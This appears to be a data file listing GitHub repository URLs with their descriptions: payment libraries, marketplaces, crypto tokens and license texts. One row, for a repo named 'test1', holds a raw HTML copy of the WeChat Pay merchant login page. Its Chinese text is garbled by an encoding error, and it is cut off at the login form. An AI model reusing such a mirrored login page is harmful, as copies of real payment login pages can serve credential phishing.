0,https://github.com/prophotos/active_merchant.git,"Active Merchant is a simple payment abstraction library used in and sponsored by Shopify. It is written by Tobias Luetke, Cody Fauser, and contributors. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.",,2
0,https://github.com/rodyDevos/crowdservice.git,"Online job posting and freelance app 1. Search potential customers and bidders nearby from Map 2. Create a Job, Bid and award 3. Ask/Answer questions after bid job 4. Message between customer and provider 5. Escrow money to merchant account when awarding job and release money after job completed 6. Disput system 7. Facebook Login",,2
0,https://github.com/TusharMazhar/product-price-comparison.git,"{""Product Price Comparison shopping engines are channels for collecting product information, including pricing, from participating retailers and then display that collective information on a single results page in response to a shopper's search query. In this way, shoppers can compare prices, shipping options, and services from multiple retailers on a single page and choose the merchant that offers the best overall value.""}",,2
0,https://github.com/a-a-ahmed/pentbox1.8.git,"PenTBox is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version. PenTBox is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.",,2
0,https://github.com/Rohan-Agrawal029/Medbazaar.git,"Medbazaar is a website that functions as a pharmaceutical metasearch engine. The website searches for medicines as requested by the user using the medicine name across various online pharmaceutical websites (like pharmeasy, medplus, netmeds etc.) and displays the relevant results sorted in increasing order of price. The user can be redirected to the ‚Äúmedicine details‚Äù page of the respective merchant website by clicking on the desired medicine. ",,2
0,https://github.com/AAlwajeeh/ArabicSF.git,"ArabicSF: is a C# application that is consists of a novel Arabic Stylometric Features Tool and other preproccessing tools which are inspired by other works such as Khoja stemmer, Light Stemmer, etc. - ***Note: This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. -  If you find this code useful, please cite the following paper:  - Mahmoud Al-Ayyoub, Ahmed Alwajeeh and Ismail Hmeidi. An extensive study of authorship authentication of Arabic articles. International Journal of Web Information Systems (IJWIS) 13(1), 2017. doi: 10.1108/IJWIS-03-2016-0011","arabic,text-processing,feature-extraction,preprocessing",2
0,https://github.com/LungProtocol/About-our-platfrom-.git,"INTRODUCTION   Lung protocol is a platform created for buyers and sellers all over the world.With an easy-to-use online store builder Platform, any seller is able to create their own storefront to sell their things, while making use of the Lung protocol platform‚Äôs wide range of features for a minimal fee.Our service offers great opportunities for self-employed and entrepreneurs, small scale manufacturers, family businesses and makers of handmade crafts, including a selection of tools for direct customer feedback, bookkeeping, sales analysis, advertising and promotion, as well as a convenient, user-friendly interface. lung protocol utilizes innovative technological features to guarantee the maximum security in all your transactions. Securely buy & sell anywhere with decentralized reputation & escrow using the L2P token.                                                                                       ABOUT PLATFORM   Lung protocol is a decentralized marketplace that allows anyone to buy and sell products or services for cryptocurrencies on a global scale. The marketplace will support thousands of merchants and millions of listings, with its primary focus on no fees. Sell and buy goods fast, secure and without commissions. Pay by crypto. Lung protocol is world‚Äôs largest decentralized, peer-to-peer marketplace. The computational efficiency of our protocol is powered by key code design features like forward and backward compatibility, component-based modular structure, and asynchronous core architecture. We are focused on bringing the benefits of this new disruptive technology to future facing enterprises that recognize its trans formative role in bringing real‚Äëworld commercial advantage. Lung protocol is a platform created for buyers and sellers all over the world. With an easy-to-use online store builder Platform, any seller is able to create their own storefront to sell their things, while making use of the Lung protocol platform‚Äôs wide range of features for a minimal fee. Our service offers great opportunities for self-employed and entrepreneurs, small scale manufacturers, family businesses and makers of handmade crafts, including a selection of tools for direct customer feedback, bookkeeping, sales analysis, advertising and promotion, as well as a convenient, user-friendly interface. Lung Protocol (L2P) powers our merchant storefronts and e-commerce ecosystem. Sell and buy goods fast, secure and without commissions. Pay by crypto.                                                                                            OUR VISION                                                                                  Our main intention is not to replace Fiat currency however, we aim to provide a unique approach to creating an ecosystem unattached to the current inflationary model. As we all know, Fiat currency is the foundational currency in which our society operates on a daily basis. Lung Protocol provides a reliable, stable and tax-exempt cryptocurrency to enable seamless transactions. A limited supply currency hosting safer transactions in an ecosystem that allows the token holders to have full control of their finances at all times. A limited supply currency in which there is no third-party requiring permission to interact with Lung Protocol (L2P).                                                                                    TOKEN INFORMATION                                                                                            Token Name  :Lung Protocol                                                                                       Token symbol  :L2P                                                                                           Token type  :ERC20                                                                                      Token contract  :0xee0f286776639cd363da810daf3e0623f82576b0                                                                                      Token Decimal  :18                                                                                        Token Supply  :750000000                                                                                                  USEFUL LINKS                                                                                                             1. https://t.me/LungProtocol_Group                                                                                                         2. https://t.me/LungProtocol_Channel                                                                                                         3. https://twitter.com/lungprotocol                                                                                                         4. https://medium.com/@lungprotocol                                                                                                         5. https://web.facebook.com/lungProtocol                                                                                                         6. https://github.com/LungProtocol                                                                                                         7. https://www.linkedin.com/company/lungprotocolinfo/                                                                                                                                                                                  EXCHANGE                                                                                        1. CryptloCEX  http://cryptlocex.com/                                                                                    2. Switchdex http://switchdex.com/                                                                                    3. Bolddax http://bolddax.com/                                                                                    4. exnce http://exnce.com/                                                                                                                                                             Ongoing till 10th July   Lung Protocol decide to arrange a self drop program to deliver an amazing eCommerce platform. As you all know for an e commerce platform community is the power to archive success for the future as well as you will be benefited by this path way there is a great chance to make money whatever you want in crypto exchange after lunching your favorite L2P in the open market. This concept will bring you a financial freedom world. Dear respectable community Lung Protocol is an ERC20 token now that is under ETHEUREUM block chain but very soon Lung Protocol will lunch main net for community betterment and to create the main vision in eCommerce sector.                                                         SELFDROP          ",,2
0,https://github.com/mosfeqanik/Payment-Gateway-with-invoice-printing-system.git,"implemented a system Created a User Registration form (User name, Password, Address, Email) and login panel.After Successful login user will land to Dashboard. In Dashboard create menu for Create Customer, Create Product, Create Invoice and View Invoice.Create a form for ‚ÄúCreate Customer‚Äù (Customer Name, Address, email), Create Product (Product name, Category, description), Create Invoice (see Attachment 01 for help).Designed database as you need to store data. In ‚ÄúView Invoice‚Äù Display the list of invoice created already. User Can View any invoice from list like a report.Integrated a Payment Method Stripe for making payment to the Merchant Account on that particular Invoice. Send Payment Confirmation (Money receipt) email to Customer email address after successful payment.I used Raw PHP or Laravel framework Mysql. ",,2
0,https://github.com/BlockchainLabs/CannabisCoin.git,"Cannabis Coin What is CannabisCoin or CANN?  Cannabis Coin is a peer-to-peer Internet digital currency that enables instant payments to anyone in the world.  It is based on the Bitcoin protocol but differs from Bitcoin in that it can be efficiently mined with consumer-grade hardware.  CannabisCoin is the payment solution for Marijuana dispensaries, retailers and merchants.  CannabisCoin crypto currency is backed by Marijuana where it is accepted.  CANN is the symbol we use to represent the Cannabis Coin in trade platforms such as Bittrex Exchange  What is the ‚ÄúYes We CANN‚Äù movement?  The Yes We CANN movement is about medical marijuana dispensaries and shop owners that participate in providing safe, affordable, and quality medicine utilizing CannabisCoin as payment. This movement is a way for dispensaries and shop owners to show their appreciation to their patients by donating some medication into the ‚ÄúCANNdy‚Äù inventory.  What is CANNdy?  CANNdy is a supply of meds that consists of strains grown specifically for CannabisCoin purchases and/or strains that can be purchased at the rate of 1 Cannabis Coin (CANN) to approx. 1 GRAM of medication.  Cannabis / Marijuana Facts  20 states in the US have legalized cannabis for medical purposes. Colorado and Washington state also permit recreational use of marijuana.  There are two very distinct groups of marijuana strains. One is cannabis; the other is hemp.  We are CANNABIS!  Cannabis is potent medicine courtesy of high amounts of CBD, medicinal terpenes, and flavonoids. It also contains varying amounts of THC. The higher the THC, the more pronounced its psychoactive effects.  What is the meaning of 420?  Straight from Wikipedia, the free encyclopedia  420, 4:20, or 4/20 (pronounced four-twenty) is a code-term that refers to the consumption of cannabis and by extension, as a way to identify oneself with cannabis subculture or simply cannabis itself.  Observances based on the number 420 include smoking cannabis around the time 4:20 p.m.  (with some sources also indicating 4:20 a.m.[1][2]) on any given day, as well as smoking and celebrating cannabis on the date April 20 (4/20 in U.S. form)",,2
0,https://github.com/geeksourcecodes/math.git,"The MIT License (MIT)  Copyright (c) 2013-present Benjamin Morel  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,2
0,https://github.com/witcherxd/witcher-guard-bot-v12.git,"MIT License  Copyright (c) 2021 Witcher Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,2
0,https://github.com/opoplmm/test1.git,"<html><head>         <meta name=""baidu-site-verification"" content=""1jPmULtLtZ"">         <meta charset=""utf-8"">         <meta http-equiv=""X-UA-Compatible"" content=""IE=9"">         <title>ÂæÆ‰ø°ÊîØ‰ªò - ‰∏≠ÂõΩÈ¢ÜÂÖàÁöÑÁ¨¨‰∏âÊñπÊîØ‰ªòÂπ≥Âè∞ ÔΩú ÂæÆ‰ø°ÊîØ‰ªòÊèê‰æõÂÆâÂÖ®Âø´Êç∑ÁöÑÊîØ‰ªòÊñπÂºè</title>         <meta name=""keywords"" content=""ÂæÆ‰ø°ÊîØ‰ªò,ÂæÆ‰ø°,ÊîØ‰ªò,ÁßªÂä®ÊîØ‰ªò,ÊâãÊú∫ÊîØ‰ªò,ÂæÆÊîØ‰ªò,ÂæÆ‰ø°ÊîØ‰ªòÂºÄÈÄö,ÂæÆ‰ø°ÊîØ‰ªòÊé•ÂÖ•,ÂæÆ‰ø°ÊîØ‰ªòÁî≥ËØ∑,ÂæÆ‰ø°ÊîØ‰ªòÂÆòÁΩë,ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞,ÂæÆ‰ø°ÊîØ‰ªòÊé•Âè£ÂºÄÂèë,ÂæÆ‰ø°ÊîØ‰ªòÊé•Âè£Áî≥ËØ∑,ÂæÆ‰ø°ÊîØ‰ªòÂÆ¢Êúç,ÂæÆ‰ø°ÊîØ‰ªòÁôªÂΩï"">         <meta name=""description"" content=""ÂæÆ‰ø°ÊîØ‰ªòÊòØËÖæËÆØÂÖ¨Âè∏ÁöÑÊîØ‰ªò‰∏öÂä°ÂìÅÁâåÔºåÂæÆ‰ø°ÊîØ‰ªòÊèê‰æõÂÖ¨‰ºóÂè∑ÊîØ‰ªò„ÄÅAPPÊîØ‰ªò„ÄÅÊâ´Á†ÅÊîØ‰ªò„ÄÅÂà∑Âç°ÊîØ‰ªòÁ≠âÊîØ‰ªòÊñπÂºè„ÄÇÂæÆ‰ø°ÊîØ‰ªòÁªìÂêàÂæÆ‰ø°ÂÖ¨‰ºóË¥¶Âè∑ÔºåÂÖ®Èù¢ÊâìÈÄöO2OÁîüÊ¥ªÊ∂àË¥πÈ¢ÜÂüüÔºåÊèê‰æõ‰∏ì‰∏öÁöÑ‰∫íËÅîÁΩë+Ë°å‰∏öËß£ÂÜ≥ÊñπÊ°àÔºåÂæÆ‰ø°ÊîØ‰ªòÊîØÊåÅÂæÆ‰ø°Á∫¢ÂåÖÂíåÂæÆ‰ø°ÁêÜË¥¢ÈÄöÔºåÊòØÁßªÂä®ÊîØ‰ªòÁöÑÈ¶ñÈÄâ„ÄÇ"">         <link rel=""shortcut icon"" href=""https://wx.gtimg.com/core/favicon.ico"" type=""image/x-icon"">         <style>             body,ol,ul,h1,h2,h3,h4,h5,h6,p{margin:0;padding:0;}             body{min-width:1200px;font:14px ""Helvetica Neue"",""Hiragino Sans GB"",""Microsoft YaHei"",""\\9ED1\\4F53"",Arial,sans-serif;background:#fff;-webkit-text-size-adjust:100%;color:#222;}             a{color:#459ae9;text-decoration:none;}             a:hover{color:#459ae9;text-decoration:underline;}             i,em{font-style:normal;}             strong{font-weight:normal;}             li{list-style:none;}             img{border:0;vertical-align:middle;}             table{border-collapse:collapse;border-spacing:0;}             .hide{display:none;}             .red{color:#ff0000;}              .login-form label,.cbx,.guide-main-li-ico,.warn,.ico-new,.ico-right{background:url(https://wx.gtimg.com/pay/img/home/base.png?v=20160112) no-repeat;}              .clr:after{content:""."";clear:both;display:block;height:0;visibility:hidden;}             .clr{zoom:1;}             .hide{display:none;}             .vs{margin:0 10px;font-family:arial;color:#ccc;}              .cbx{width:16px;height:16px;display:inline-block;margin:-3px 6px 0 0;*margin-top:0;vertical-align:middle;cursor:pointer;overflow:hidden;}             .cbx{background-position:0 -54px;}             .cbx-on{background-position:0 -80px;display:inline-block;}              .wrap{width:1025px;margin:0 auto;overflow:hidden;zoom:1;}             .container{margin:25px auto;}             .topbar{height:33px;line-height:33px;color:#999;background:#f6f6f6;border-bottom:1px solid #dcdcdc;font:12px/33px tahoma,arial,""Hiragino Sans GB"",\\5B8B\\4F53,sans-serif;}             .topbar a{color:#00c901;}              .header{position:relative;z-index:99;background-color:#fff;/*border-top:4px solid #44b549;*/border-bottom:1px solid #d9dadc;}             .header .wrap{height:60px;position:relative;overflow:visible;z-index:999}             .header .logo{float:left;width:232px;overflow:hidden;}             .header .logo a{display:block;height:40px;margin-top:12px;text-indent:-999px;background:url(https://wx.gtimg.com/pay/img/common/logo.png?v=20160114) no-repeat}             .header .link{float:right;line-height:60px;}             .header .link a{color:#222;}             .header .link a:hover{color:#459ae9}             .header .pole-msg{display:inline-block;*display:inline;position:relative;}             .header .pole-msg a.content-us{display:inline-block;width:75px;height:60px;position:relative;z-index:9;}             .header .pole-msg a.content-us:hover{color:#222;text-decoration:none;}             .header .pole-msg.show-popup a.content-us{background:#fff;border-left:1px solid #e7e7eb;border-right:1px solid #e7e7eb;padding-left:16px;margin:0 -1px 0 -17px;*left:-17px;}             .header .popup{display:none;position:absolute;top:59px;left:-97px;border:1px solid #e7e7eb;z-index:8;width:131px;}             .header .show-popup .popup{display:block;line-height:26px;padding:14px 20px;background:#fff;}             .header .show-popup .popup p{font-size:12px;color:#999}             .header .show-popup .popup p.tel{color:#333333;font-size:17px;}             .header .show-popup .popup .bor-top{border-top:1px solid #e7e7eb;margin-top:10px;padding-top:10px;}             .header .dropdown-arrow{position:absolute;right:6px;top:29px;border-color:#c2c2c2 transparent transparent;border-style:solid dashed dashed;border-width:4px 4px 0;font-size:0;height:0;width:0;line-height:0;}             .header .show-popup .dropdown-arrow{-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-o-transform:rotate(180deg);transform:rotate(180deg);-webkit-transition:all .25s ease 0s;-moz-transition:all .25s ease 0s;-o-transition:all .25s ease 0s;transition:all .25s ease 0s;}              .footer{text-align:center;padding-bottom:20px;color:#999999;font:12px/1.6 tahoma,arial,""Hiragino Sans GB"",\\5B8B\\4F53,sans-serif;}             .footer p{margin-bottom:8px;}             .footer a{color:#999999;}             .footer a:hover{color:#459ae9}              .banner{height:410px;position:relative;}             .banner .wrap-login{position:relative;z-index:2;}             .banner .login{float:right;width:314px;margin-top:20px;padding:15px 15px 20px;background:rgba(255,255,255,0.8);position:static;border:1px solid #fff;}              @media \\0screen\\,screen\\9{                 .banner .login{background:#fff;filter:alpha(opacity=80);*zoom:1;position:static;}                 .banner .login .login-in{position:relative;}             }             .banner .login h2{margin-bottom:5px;font-size:20px;font-weight:400;}             .banner .login h2 strong{display:none;}             .banner .login a{color:#333}             .banner .login a:hover{color:#459ae9}             .banner .login .tips-error a,.banner .login .tips-warn a{color:#459ae9}             .banner .login .tips-error{line-height:24px;font-size:13px;}             .banner .login .tips-warn .warn{float:left;width:16px;height:16px;background-position:-24px 0;margin-top:4px;}             .banner .login .tips-warn p{float:right;color:#b29b4a;width:290px;font-size:13px;line-height:24px}             .banner .login-form .login-mainly{margin-top:10px;margin-bottom:10px;}             .banner .login-form .login-account,.banner .login-form .login-password{height:42px;line-height:42px;padding:3px 0;background:#fff;border-left:1px solid #cecece;border-top:1px solid #cecece;position:relative;padding-left:54px;}             .banner .login-form label{width:20px;height:20px;overflow:hidden;text-indent:-999px;position:absolute;left:20px;top:30%}             .banner .login-form input{width:100%;padding:11px 0;border:0;box-shadow:0;outline:0;vertical-align:middle;font-family:""Microsoft YaHei"";font-size:14px;}             .banner .login-form .ico-account{background-position:0 0;}             .banner .login-form .ico-password{background-position:0 -26px;}             .banner .login-form .login-password{margin-top:10px;}             .banner .login-password-on .login-account{border-bottom:none;}             .banner .login-verify{margin-bottom:10px;height:38px;}             .banner .login-verify input{width:100px;padding:10px;vertical-align:middle;vertical-align:middle;border-left:1px solid #cecece;border-top:1px solid #cecece;}             .banner .login-verify input:focus{border-left:1px solid #cecece;border-top:1px solid #cecece;}             .banner .login-verify .img-verify{width:100px;height:40px;margin:0 11px;vertical-align:middle;}             .banner .login-memory{margin-bottom:20px;overflow:hidden;zoom:1;}             .banner .login-memory .memory-account{float:left;}             .banner .login-memory .forget-password{float:right;}             .banner .login .btn-login{display:inline-block;width:100%;height:45px;line-height:45px;background-color:#00c800;color:#fff;border:1px solid #44b549;text-align:center;font-size:20px;}             .banner .login .btn-login:hover{text-decoration:none;background:#2F9833;color:#fff;}              .guide-main-li-ico{display:inline-block;width:73px;height:57px;}             .ico-mp{background-position:2px -159px;}             .ico-app{background-position:8px -366px;}             .ico-code{background-position:4px -230px;}             .ico-shuaka{background-position:8px -294px;}              /*ÊúÄÊñ∞ÂÖ¨Âëä*/             .cms-notice{margin:5px 0 -7px;position:relative;}             .cms-notice h2,.cms-notice ul,.cms-notice p{display:inline-block;line-height:20px;}             .cms-notice h2{float:left;background:#595B5B;color:#fff;font-size:14px;padding:0px 4px;}             .cms-notice li{float:left;margin-left:18px;width:275px;}             .cms-notice a{color:#222}             .cms-notice a:hover{color:#459ae9}             .cms-notice li span.time{float:left;color:#999;margin-right:5px;}             .cms-notice li a{display:inline-block;max-width:205px;_width:205px;height:21px;white-space:nowrap;overflow-x:hidden;text-overflow:ellipsis;}             .cms-notice p{float:right;}             .cms-notice p a{color:#222;}             .cms-notice li .ico-new{position:absolute;display:inline-block;width:17px;height:9px;margin-left:5px;background:url(https://wx.gtimg.com/mch/img/ico-new.png);}             .cms-notice .more{position:absolute;top:0;right:0;}             .cms-notice .more .ico-right{display:inline-block;width:11px;height:9px;margin:0 0 0 3px;vertical-align:middle;background-position:-4px -135px;}              /*ÂõõÂ§ßÊîØ‰ªòÊñπÂºè*/             .title{margin-top:45px;}             .title h2,.title .line,.title .pay-btn{display:inline-block;}             .title h2{font-size:20px;font-weight:normal;color:#333;background:#fff;position:absolute;margin-top:-15px;padding-right:10px;}             .title .pay-btn{position:absolute;right:0;margin-top:-14px;background:#fff;padding-left:5px;}             .title .pay-btn a{display:block;border:1px solid #3e3a39;padding:2px 5px 2px 17px;color:#333333;}             .title .pay-btn a:hover{text-decoration:none}             .through{height:326px;margin-top:20px;padding-bottom:35px;border-bottom:1px dotted #ccc;background:url(https://wx.gtimg.com/pay/img/home/qrcode.png?v=20150602) center top no-repeat;}             .through li{font-size:16px;margin-top:58px;margin-left:68px;position:absolute;}             .through li.l02{margin-top:143px;}             .through li.l03{margin-top:228px;}             .through li.l04{margin-left:748px;}             .through li.l05{margin-top:143px;margin-left:755px;}             .through li.l06{margin-top:228px;margin-left:755px;}              .guide-main{margin-top:37px;margin-bottom:5px;}             .guide-main li{width:240px;height:266px;background-color:#FFFFFF;float:left;margin-right:21px;_margin-right:20px;text-align:center}             .guide-main .guide-main-li-4{margin-right:0;}             .guide-main li a{width:239px;height:266px;display:block;position:relative;border:1px solid #e5e5e5;}             .guide-main li .title{display:block;color:#000000;font-size:16px;line-height:1;margin-top:25px;font-weight:normal}             .guide-main li .info{display:block;color:#999999;font-size:12px;line-height:1;margin-top:14px;}             .guide-main li .info .strong{font-weight:bold;}             .guide-main-li-ico{margin-top:72px;-webkit-transition:margin-top 0.2s linear;-moz-transition:margin-top 0.2s linear;-ms-transition:margin-top 0.2s linear;-o-transition:margin-top 0.2s linear;transition:margin-top 0.2s linear;}             .guide-main li .btngreen{display:none;margin:20px auto 0;width:191px;height:35px;line-height:35px;background-color:#00C800;font-size:14px;color:#FFFFFF;border-bottom:1px solid #00A000;}             .guide-main li .btngray{background-color:#E6E6E6!important;color:#666666!important;border-bottom:1px solid #CCCCCC;}             .guide-main-li-3 .tips{display:none;font-size:12px;color:#FF9900;line-height:1;}             .guide-main-li-3 .tips .ico-info-orange{vertical-align:-3px;*vertical-align:1px;margin-right:5px;margin-top:12px;}             .guide-main li a:hover{border:1px solid #00c800;text-decoration:none}             .guide-main li a:hover .btngreen{display:block;}             .guide-main li a:hover .tips{display:block;}             .guide-main li a:hover .guide-main-li-ico{margin-top:45px;-webkit-transition:margin-top 0.2s linear;-moz-transition:margin-top 0.2s linear;-ms-transition:margin-top 0.2s linear;-o-transition:margin-top 0.2s linear;transition:margin-top 0.2s linear;}             .guide-link{padding-top:120px;padding-bottom:58px;position:relative;height:24px;}             .guide-link-a{color:#00C800;font-size:18px;height:24px;width:162px;}             .guide-link-a .ico-arrow-right{vertical-align:-2px;*vertical-align:3px;margin-left:8px;cursor:pointer;}             .guide-link-code{display:none;position:absolute;border:1px solid #C9C9C9;padding:6px;background-color:#FFFFFF;width:105px;height:105px;top:67px;left:50%;margin-left:90px;}             .show-code .guide-link-code{display:block;}             .show-code .ico-arrow-right{-webkit-transform:scale(-1, 1);-moz-transform:scale(-1, 1);-ms-transform:scale(-1, 1);-o-transform:scale(-1, 1);transform:scale(-1, 1);}              /*ÂõæÁâáËΩÆÊí≠*/             .cms-banner{position:absolute;top:0;width:100%;height:410px;overflow:hidden; left:0}             .cms-banner a{display:block;width:100%;height:410px;text-indent:-9999px;}             .cms-banner ul li{position:absolute;top:0;width:100%;height:410px;background-position:center;background-repeat:no-repeat;}             .cms-banner ol{position:absolute;z-index:9;bottom:0px;display:table;left:50%;margin-left:-73px;padding:16px 16px 16px 0;}             .cms-banner ol li{float:left;width:10px;height:10px;margin-left:16px;text-indent:-9999px;background:#fff;border-radius:5px;overflow:hidden;}             .cms-banner ol li.active{background:#44B549;}         </style>     </head> <body class=""index"" onclick=""pgvWatchClick();"">  <!-- Â§¥ÈÉ®[[ --> <!-- Â§¥ÈÉ® [[ --> <script>var _speedMark=Date.now()</script> <!--Â∞è‰∫éie7 Ë∑≥ËΩ¨Âà∞ÈîôËØØÈ°µÈù¢ --> <!--[if lt IE 7]> <script>     window.location.href=\'https://pay.weixin.qq.com/public/error/browser_tips\'; </script> <![endif]--> <div class=""topbar"">     <div class=""wrap"">         <span onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.CHINA_BUSINESS\);"">Â¢ÉÂÜÖ‰∏öÂä°</span>         <i class=""vs"">|</i>         <a onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.INTERNATIONAL_BUSINESS\);"" href=""https://pay.weixin.qq.com/index.php/public/wechatpay"" target=""_blank"">International business</a>     </div> </div> <div class=""header"">     <div class=""wrap"">         <div class=""logo""><h1><a href=""/index.php/core/account"" title=""ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞"">ÂæÆ‰ø°ÊîØ‰ªòÂïÜÊà∑Âπ≥Âè∞</a></h1></div>         <div class=""link"">             <a href=""https://pay.weixin.qq.com/partner/public/home"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.SERVICE_PROVIDER\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>ÊúçÂä°ÂïÜ</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/wxzf_guide/index.shtml"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.WXZF_GUIDE\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>Êé•ÂÖ•ÊåáÂºï</a>             <i class=""vs"">|</i>             <a href=""https://pay.weixin.qq.com/wiki/doc/api/index.php"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.API_DOC\);""><strong class=""hide"">ÂæÆ‰ø°ÊîØ‰ªò</strong>ÂºÄÂèëÊñáÊ°£</a>             <i class=""vs"">|</i>             <div class=""pole-msg showPopUpJS"">                 <a class=""content-us"" href=""javascript:;"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.HELP_CENTER\);"">Â∏ÆÂä©‰∏≠ÂøÉ<span class=""dropdown-arrow""></span></a>                 <div class=""popup"">                     <div class=""inner"">                         <ul>                             <li>                                 <p class=""tel"">ÂÆ¢ÊúçÔºö95017</p>                                 <p>Âë®‰∏ÄÂà∞Âë®‰∫î 09:00-18:00</p>                             </li>                             <li class=""bor-top"">                                 <a href=""http://kf.qq.com/product/wechatpaymentmerchant.html"" target=""_blank"" onclick=""pgvSendClick({hottag:\'PAY.HOME.NAVI.QQ_KEFU\);"">Ëá™Âä©ÊúçÂä°‰∏ìÂå∫</a>                             </li>                         </ul>                     </div>                 </div>             </div>         </div>     </div> </div>  <script src=""https://wx.gtimg.com/third/jquery/jquery-1.7.min.js""></script> <script type=""text/javascript"">if(typeof $jqueryUi == ""undefined""){document.write(\'<script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+"">\');}</script><script type=""text/javascript"" src=""https://wx.gtimg.com/third/jquery/jquery-ui.js""></script""+""> <script>window[""MCH.common.time""]=[new Date()]</script> <script id=""legos:22195"" ver=""22195:20140901:20160908155731"" name=""MCH.common"" src=""https://wx.gtimg.com/mch/js/ver/2014/09/mch.common.20140901.js?t=20160908155731"" charset=""utf-8""></script><div class=""mask-layer hide"" id=""header-masker""></div><!--[if !IE]>|xGv00|c95d265e97fcc54b235954b5b4a712f5<![endif]--> <script>window[""MCH.header.time""]=[new Date()]</script> <script id=""legos:22118"" ver=""22118:20140422:20160620111341"" name=""MCH.header"" src=""https://wx.gtimg.com/mch/js/ver/2014/04/mch.header.20140422.js?t=20160620111341"" charset=""utf-8""></script><!--[if !IE]>|xGv00|da289bab2d090281ed2476547ba6b944<![endif]--> <!-- Â§¥ÈÉ® ]] --><!--[if !IE]>|xGv00|73bbdddabec4f094fcae10c51db0f883<![endif]--> <!-- Â§¥ÈÉ® ]] -->  <!-- ÁôªÂΩï[[ --> <div class=""banner"">      <div class=""cms-banner cms-area"" id=""cmspic_1000"" home=""true""><ul><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJutFViafoibhr5UHrDC2mbMGDZyLEY3icMbqS2o3BoicgX18HtuYicRR0fOJM/0&quot;);""><a target=""_blank"" href=""https://pay.weixin.qq.com/public/qrcode_pay"">banner</a></li><li style=""opacity: 0.248188; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuvfQibNQiaWz5VUDocbQSYYe3hM60YBT0t6AWkzDjcIFFgQxckUUn64nQ/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0.751812; z-index: 1; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuv0wHAj5rxw34SXVgoycsicBB7zpopLBoGzl6S7EicZPsOPsyfj90NG2I/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuupH9MJ5hbqw5sMmlyyn0UnUicF2UeHLKEkCO11MnS1DoXXicX3gOwfuK/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li><li style=""opacity: 0; z-index: 0; background-image: url(&quot;https://shp.qpic.cn/mmpay/oU5xbewRJuuZ81jvVm2RMN2C3hBE2oKW6UjJKs99mAZRxGOdCFYkyMU8NxHLDlLQ/0&quot;);""><a target=""_blank"" href=""http://v.qq.com/x/cover/mv3e2ecbtloy44o.html?vid=u01960zjo7r"">banner</a></li></ul><ol class=""dots"" style=""opacity: 1; z-index: 1;""><li class=""dot"">1</li><li class=""dot"">2</li><li class=""dot active"">3</li><li class=""dot"">4</li><li class=""dot"">5</li></ol></div>     <div class=""wrap"">         <div class=""wrap-login"">             <div class=""login"">                 <div class=""login-in"">                     <h2><span 